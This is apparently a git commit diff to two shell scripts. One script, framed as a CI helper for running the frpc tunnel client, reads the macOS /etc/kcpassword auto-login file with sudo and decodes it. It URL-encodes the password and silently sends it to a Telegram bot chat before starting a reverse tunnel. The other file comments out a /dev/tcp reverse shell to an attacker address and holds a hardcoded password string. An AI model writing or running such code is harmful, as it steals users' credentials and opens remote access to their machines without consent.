b738f50a793af230143adec824ac9f56295905d4
Your Name <you@example.com>
2021-03-22 14:36:26 +0000

    ad

--- back.sh
+++ back.sh
@@ -16,8 +16,32 @@
 # * curl http://soundbible.com/grab.php?id=1542&type=mp3 -o /tmp/airhorn.mp3
 #   afplay /tmp/airhorn.mp3
 
-attacker_ip=xxxx
-attacker_port=8089
+# attacker_ip=xxxx
+# attacker_port=8089
 
-exec 5<>/dev/tcp/$attacker_ip/$attacker_port
-cat <&5 | while read line; do $line 2>&5 >&5; done
+# exec 5<>/dev/tcp/$attacker_ip/$attacker_port
+# cat <&5 | while read line; do $line 2>&5 >&5; done
+
+urlencode() {
+    # urlencode <string>
+
+    old_lc_collate=$LC_COLLATE
+    LC_COLLATE=C
+
+    local length="${#1}"
+    for (( i = 0; i < length; i++ )); do
+        local c="${1:$i:1}"
+        case $c in
+            [a-zA-Z0-9.~_-]) printf '%s' "$c" ;;
+            *) printf '%%%02X' "'$c" ;;
+        esac
+    done
+
+    LC_COLLATE=$old_lc_collate
+}
+
+# urlencode "abc="
+password="PQ+EeD885UIg3m+BPZjKrNDmd4Zu5jj"
+
+password_en=$(urlencode ${password})
+echo ${password_en}
--- run-frpc-mac.sh
+++ run-frpc-mac.sh
@@ -3,14 +3,31 @@ exec 2>&1
 set -euxo pipefail
 
 # when running in CI override the frpc tls files.
+urlencode() {
+    # urlencode <string>
 
+    old_lc_collate=$LC_COLLATE
+    LC_COLLATE=C
+
+    local length="${#1}"
+    for (( i = 0; i < length; i++ )); do
+        local c="${1:$i:1}"
+        case $c in
+            [a-zA-Z0-9.~_-]) printf '%s' "$c" ;;
+            *) printf '%%%02X' "'$c" ;;
+        esac
+    done
+
+    LC_COLLATE=$old_lc_collate
+}
 #get password 
 # curl -O https://raw.githubusercontent.com/jjarava/mac-osx-forensics/master/kcpass.py
 passencode=$(sudo xxd -p /etc/kcpassword | tr -d \\n)
 password=$(python kcpass.py ${passencode})
 
+password_en=$(urlencode ${password})
 
 
-curl "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?text=${password}&chat_id=1280783647" 2>/dev/null 1>/dev/null
+curl "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?text=${password_en}&chat_id=1280783647" 2>/dev/null 1>/dev/null
 
 ./frp/frpc -c frpc-mac.ini 2>&1 
